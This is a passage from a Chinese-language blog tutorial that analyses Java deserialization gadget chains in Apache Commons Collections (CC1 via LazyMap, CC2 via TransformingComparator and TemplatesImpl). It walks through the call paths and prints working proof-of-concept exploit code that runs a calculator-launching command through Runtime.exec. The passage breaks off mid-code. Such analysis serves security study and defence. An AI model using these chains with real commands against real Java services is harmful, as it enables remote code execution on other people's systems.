<p>先在AnnotationInvocationHandler.readObject下断点，然后over-step:</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171910871.png" alt="image-20210513171910871"></p>
<p>果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。</p>
<p>mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。</p>
<p>那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p>
<p>这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182135950.png" alt="image-20210513182135950"></p>
<p>这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182402111.png" alt="image-20210513182402111"></p>
<p>这会再一次触发h1的invoke函数，并且现在this.memberValues的值为h1的参数，类型是LazyMap，factory就是lazymap属性，就是我们传进去的chain，的那么就会进入LazyMap.get方法：</p>
<p>LazyMap.get内部就会有transform方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513183528337.png" alt="image-20210513183528337"></p>
<p>如果当前factory是我们的chain，那就会触发RCE。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject() -&gt; </span><br><span class="line">  AnnotationInvocationHandler.readObject() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt;</span><br><span class="line">  AnnotationInvocationHandler.invoke() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; </span><br><span class="line">  ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; </span><br><span class="line">  RCE</span><br></pre></td></tr></table></figure>



<h4 id="最终版本PoC-1"><a href="#最终版本PoC-1" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_LazyMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建携带着LazyMap的AnnotationInvocationHandler实例h1</span></span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h2><p>条件：</p>
<ul>
<li><strong>commons-collections4: 4.0</strong></li>
<li>jdk1.7 1.8低版本</li>
</ul>
<p>maven：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>预备知识：</p>
<p><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">javassist</a></p>
<p><a href="https://0range228.github.io/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/">JVM类加载机制</a></p>
<h3 id="利用链寻找-2"><a href="#利用链寻找-2" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>第一件事依然是寻找readObject复写点，这次盯上的是jdk的<strong>PriorityQueue</strong>：</p>
<blockquote>
<p>PriorityQueue 优先级队列是基于优先级堆的一种特殊队列 , 它满足队列 “ 队尾进 , 队头出 “ 的特点 </p>
<p><strong>队列中每次插入或删除元素时 , 都会调用 Comparator 方法对队列进行调整</strong> </p>
<p><strong>缺省情况下 , 优先级队列会根据自然顺序对元素进行排序 , 形成一个最小堆( 父节点的键值总是小于或等于任何一个子节点的键值 ) . 当指定了Comparator后 , 优先级队列会根据Comparator的定义对元素进行排序.</strong></p>
</blockquote>
<p>梳理了一下PriorityQueue类的流程：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514104821773.png" alt="image-20210514104821773"></p>
<p>可以看到queue和comparator都是进行了可控性的传递。</p>
<p>那这里我们继续寻找哪些实现了Comparator接口的类拥有compare方法，目标锁定到<strong>TransformingComparator</strong>：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514120620377.png" alt="image-20210514120620377"></p>
<p>哦这熟悉的transformer.transform 可控！</p>
<p>但是他并不像ChainedTransformer一样是成环transform，仅仅调用了一次Comparator.compare。</p>
<h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><h4 id="最终版本PoC-2"><a href="#最终版本PoC-2" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>这里完全可以借助这一点，写一版PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_TransformingComparator_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] raw_payload = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /Applications/Calculator.app"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(raw_payload);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc2_TransformingComparator.ser"</span>)));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>细节</p>
<ol>
<li>为什么put了两个值：</li>
</ol>
<p>因为在heapify方法实现如下：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514110829082.png" alt="image-20210514110829082"></p>
<p>这里只有size&gt;1才能进入循环。</p>
<ol start="2">
<li>add做了什么事？</li>
</ol>
<p>两次add做了什么事，这里要force-step(红色的小箭头)进入</p>
<p>调用梳理如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add() -&gt; offer() -(第二次才会)-&gt; siftUp() -&gt; siftUpComparable()</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112304003.png" alt="image-20210514112304003"></p>
<p>第二次：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112556522.png" alt="image-20210514112556522"></p>
<p>由于我们没有设置comparator，所以会进入else分支：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p>
<p>siftUpComparable方法只是把元素放到队列里，并没有做什么事：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514113611190.png" alt="image-20210514113611190"></p>
<ol start="3">
<li>为什么还反射来构造函数来修改值？</li>
</ol>
<p>因为为了可以满足赋值，需要让comparator属性为null，才能继续走：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514112722687.png" alt="image-20210514112722687"></p>
<p>当我们再次反射，是为了可以在之后的readObject里面使用comparator属性来调用compare方法，我们需要给他赋值恶意chain。</p>
<h4 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h4><ol>
<li>payload：PriorityQueue（2，TransformingComparator(transformer = chain)）</li>
<li>对于PriorityQueue来说，他的comparator就是TransformingComparator(transformer = chain)这一串东西。</li>
<li>首先肯定是进入PriorityQueue的readObject方法，一路走。</li>
<li>之后重点在PriorityQueue的siftDown方法中，会校验comparator是否为null，显然不是，进入siftDownUsingComparator方法。</li>
<li>之后在siftDownUsingComparator进行了comparator.compare，下图显示</li>
<li>由于comparator是TransformingComparator类对象，所以进入TransformingComparator的compare方法</li>
<li>这时TransformingComparator对象的this.transformer属性就是chain，chain.transform成环调用，触发。</li>
</ol>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122321048.png" alt="image-20210514122321048"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514122515406.png" alt="image-20210514122515406"></p>
<p>第一个transform就会触发。</p>
<h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>ysoserial用的是这个版本</p>
<blockquote>
<p>之前提到过，TransformingComparator的compare内部并不像ChainedTransformer的transform一样是成环transform。</p>
</blockquote>
<p>ysoserial把目光聚焦在了TemplatesImpl里面</p>
<p>TemplatesImpl位于rt.jar下的sun包里面，源码分析：</p>
<p>TemplatesImpl这个类有两个属性：</p>
<ul>
<li>_bytecodes：byte[] 字节码的字节数组</li>
<li>_class: Class[] 根据 _bytecode 生成的Class对象</li>
</ul>
<p>可以看到：</p>
<p>getTransletInstance</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514132343726.png" alt="image-20210514132343726"></p>
<p>defineTransletClasses</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115801660.png" alt="image-20210514115801660"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514115709993.png" alt="image-20210514115709993"></p>
<p>我们都知道静态代码块可以在类加载的同时执行，所以我们只要生成一个类，这个类的静态代码块里执行恶意命令。</p>
<p>所以这里我们就要找，哪里可以调用getTransletInstance方法，</p>
<p>发现在本类的newTransformer里面调用了getTransletInstance：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133144671.png" alt="image-20210514133144671"></p>
<p>那哪里调用了newTransformer方法呢？发现在getoutputProperties里调用了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514133248367.png" alt="image-20210514133248367"></p>
<p>这部分有点乱画个调用图：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514183849675.png" alt="image-20210514183849675"></p>
<p>所以到目前为止，我们的收获：</p>
<ol>
<li>PriorityQueue的readObject可以走到Comparator接口的compare方法</li>
<li>TransformingComparator是Comparator的实现类，TransformingComparator的transform方法会调用Tranformer接口的transform函数</li>
<li>另一方面，TransformerImpl的newTransformer的一系列操作可以将_bytecode数组里面的内容加载进虚拟机，获得一个AbstractTranslet类的对象</li>
<li>创建这个对象的时候，Class类对象里的静态代码块必将被执行</li>
</ol>
<p>所以现在的问题就是，如何将一个实现了Tranformer接口的类，他的transform方法和TransformerImpl的newTransformer结合到一起。</p>
<h4 id="纽带"><a href="#纽带" class="headerlink" title="纽带"></a>纽带</h4><p>我们发现TransformingComparator的构造函数可以将Transformer类放入自身<em>transformer</em>类属性：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514142610125.png" alt="image-20210514142610125"></p>
<p>隐隐约约感觉能连上！</p>
<p>ysoserial的思路是将恶意操作放在一个类的静态代码块中，将这个类的bytecode传递给某个可控参数，最终传递给invoke函数命令执行。</p>
<p>开始构造PoC：</p>
<p>构造流程:</p>
<ol>
<li>首先我们要有一个PriorityQueue对象pq在最外面，作为readObject的入口</li>
<li>javassist生成一个恶意类，它的静态代码块中有恶意命令，获得这个恶意类的字节数组</li>
<li>拿到之后如何传递到链中，我们的payload说到底是一个static代码块，最理想的情况就是它被newInstance了，那我们就要找哪些方法可以做到，等等，好像不需要再找了，因为前文提到的TemplatesImpl的_bytecode数组内容在TemplatesImpl的getTransletInstance方法中被defineClass了</li>
<li>那么，现在问题就来到哪些类可以调用getTransletInstance方法呢？发现正巧的是TemplatesImpl自己的newTransformer就可以调用</li>
<li>所以现在就来到哪里可以调用newTransformer方法，发现没有，但是我们降维武器反射，这里需要用InvokeTransformer[]来包装一下“newTransformer”</li>
<li>现在还需要一个TemplatesImpl对象tmpl来帮我们做纽带，并且将这个对象的bytecode属性设置为恶意类，还要保证属性name不为null</li>
<li>tmpl现在的bytecode属性内容就是恶意类，所以调用tmpl的newTransformer方法就可以了！</li>
</ol>
<h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><ol>
<li><p>为什么恶意类要继承AbstractTranslet？</p>
<p>因为TemplatesImpl的defineTransletClasses方法中有个判断，如果当前恶意类的父类不是AbstractTranslet的话，<code>_tranletIndecx</code>的值就是初始值-1。但是对于我们，class[0]就是我们的恶意类的Class对象，后续的newInstance离不开它，所以我们当然希望<code>_tranletIndex</code>的值就是0。</p>
</li>
</ol>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514163650043.png" alt="image-20210514163650043"></p>
<p>为什么<code>_tranletIndex</code>的值一定要是0呢？？？因为我们可以看到在TemplatesImpl的getTransletInstance中：<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164219670.png" alt="image-20210514164219670"></p>
<p><code>_transletIndex</code>决定了<code>_class</code>数组的检索位置。</p>
<ol start="2">
<li>为什么<code>_name</code>和<code>_class</code>属性要为null？</li>
</ol>
<p>因为在getTransletClasses中，只有满足这两个方法，才能进入defineTransletClasses：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514164740087.png" alt="image-20210514164740087"></p>
<ol start="3">
<li>为什么要改<code>size</code>的值？</li>
</ol>
<p>因为在heapify()中：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514165822726.png" alt="image-20210514165822726"></p>
<p>PriorityQueue的size属性默认是0，在这就会断掉。</p>
<ol start="4">
<li>为什么不能直接给PriorityQueue的queue属性去赋值？非要用反射？</li>
</ol>
<p>queue的值其实会在compare中当作参数，所以一定要有值。</p>
<p>不能直接赋值是因为：</p>
<p>抛开queue属性是private transient Object[] queue;</p>
<p>queue属性以及其长度都是初始化时候得到的</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172000161.png" alt="image-20210514172000161"></p>
<p>好的现在如果是queue.add()的话：</p>
<p>只改一个地方：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514172637366.png" alt="image-20210514172637366"></p>
<p>(其实这里面只add一次tmpl也是可以的)</p>
<p>第一次是2，他会先进行一个自动装箱，变成new Integer(2)，因为PriorityQueue接受Obejct泛型。</p>
<p>第一次由于size是初始值0，所以只是老实的进入queue[0]，size变成1</p>
<p>第二次由于是i=size，目前size是1，会进入siftUp函数</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173317035.png" alt="image-20210514173317035"></p>
<p>然后进入siftUpUsingComparator：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173453769.png" alt="image-20210514173453769"></p>
<p>这里多说几句，可以看到k，x两个参数1和tmpl</p>
<p>parent是0，e=queue[1]也就是Integer(1)</p>
<p>接下来会进入comparator的compare方法；</p>
<p>来到第一个tranform：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514173727496.png" alt="image-20210514173727496"></p>
<p>仔细看的话可以看出来obj1是上面siftUpUsingComparator函数的第二个函数x也就是Tmpl，obj2是上面的e，就是第一次传进去的值2</p>
<p><strong>这里就会提前触发调用链，利用失败。</strong></p>
<p>多说一句，就算绕过这里，在第三行this.decorated.compare语句又会走向哪里？</p>
<p>我们当前传进来的comparator采用的是第一个构造函数，只有一个InvokerTransformer[]</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174908649.png" alt="image-20210514174908649"></p>
<p>这里面第二个参数是什么？</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514174938291.png" alt="image-20210514174938291"></p>
<p>再点进去发现是包装类的compareTo方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514175531065.png" alt="image-20210514175531065"></p>
<p>那就没事了。</p>
<p>现在可以回答这个问题了，因为<strong>会提前触发利用链</strong>，并且value1和value2的分别是两次transform的值，如果类型相同，是会走到这里的。</p>
<ol start="5">
<li>第一个传进去的tmpl在哪里用到了？</li>
</ol>
<p>跟一遍，会发现在compare这里传进去了，给了transform：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180443283.png" alt="image-20210514180443283"></p>
<ol start="6">
<li><p>细心的你会发现，PriorityQueue的queue这个属性是transient的，为什么还能序列化成功？</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514180903833.png" alt="image-20210514180903833"></p>
</li>
</ol>
<p>queue本身作为transient属性，讲道理是不能写入到序列化的二进制文件中的。</p>
<p>是因为在PriorityQueue的writeObject方法中：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210514181212114.png" alt="image-20210514181212114"></p>
<p>他先拿到流，然后把queue的内容循环的写入到流中，这样就被保存了下来。</p>
<h4 id="最终版本PoC-3"><a href="#最终版本PoC-3" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        